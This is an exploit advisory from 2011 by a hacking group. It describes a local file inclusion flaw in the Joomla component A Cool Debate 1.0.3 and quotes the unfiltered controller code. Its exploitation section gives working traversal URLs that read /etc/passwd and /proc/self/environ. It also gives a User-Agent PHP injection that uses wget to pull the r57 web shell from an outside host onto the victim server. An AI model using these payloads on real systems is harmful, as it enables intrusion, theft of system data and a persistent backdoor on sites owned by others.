@@ -1,0 +1,79 @@
+A Cool Debate 1.0.3 Component Joomla Local File Inclusion
+=========================================================================================
+ 
+- Discovered by : Chip D3 Bi0s
+- Email         : chipdebios[at]gmail[dot]com
+- Group         : LatinHackTeam
+- Date          : 18 june 2011
+- Where         : From Remote
+ 
+-------------------------------------------------------------------------------------
+Affected software description
+ 
+Application     : A Cool Debate
+Developer       : oasis fleeting
+version         : 1.0.3
+License         : GPLv2 or later
+Date Added      : 5 June 2011
+Download        : http://www.acoolsip.com/development/a-cool-debate.html
+ 
+I. BACKGROUND
+ 
+
+When building this component I drew on debate.org as an example. With the upcoming elections in the U.S.A.
+ I figure that this will become a very popular extension for joomla. This component integrates with the most
+ popular community extensions for joomla, Community Builder, Jomsocial and CBE.
+
+This is the first release candidate of this extension and is ready for users to put it through their test.
+It is free and still in an early stage.
+
+Debate or debating is a formal method of interactive and representational argument. Debate is a broader
+form of argument than logical argument, which only examines consistency from axiom, and factual argument,
+which only examines what is or isn't the case or rhetoric which is a technique of persuasion. Though logical
+consistency, factual accuracy and some degree of emotional appeal to the audience are important elements of the
+art of persuasion, in debating, one side often prevails over the other side by presenting a superior "context" and/or
+framework of the issue, which is far more subtle and strategic.
+ 
+II. DESCRIPTION
+ 
+Some Local File inclusion vulnerabilities exist in Component A Cool Debate 1.0.3.
+ 
+ 
+ 
+III. ANALYSIS
+ 
+The bug is in the following files, specifying the lines in 
+ 
+components/com_acooldebate/acooldebate.php
+ 
+ 
+ 
+   // Require specific controller if requested
+   if($controller = JRequest::getVar('controller')) {
+	    require_once (JPATH_COMPONENT.DS.'controllers'.DS.$controller.'.php');
+ 
+ Explanation:As noted in the line [16] $controller
+ nowhere is filtered, which result is lfi as is known to pass '.php' use %00 :)
+ 
+ 
+IV. EXPLOITATION
+it is logical that {LFI} depends on the number of directories served,
+which can be assumed when the error it prints on the web
+ 
+http://site/path/index.php?option=com_acooldebate&controller={LFI}
+{LFI}=../../../../../../../../../../etc/passwd%00
+{LFI}=../../../../../../../../../../proc/self/environ%00
+
+
+ 
+changing the user agent for something so:
+<?system('wget http://chipdebios.com/r57.txt -O r57.php');?>
+ 
+A special greeting to my good friends:
+R4y0k3nt, ecore, J3h3s, r0i & pc Marquesita :)
+ 
+ 
+ 
++++++++++++++++++++++++++++++++++++++++
+[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
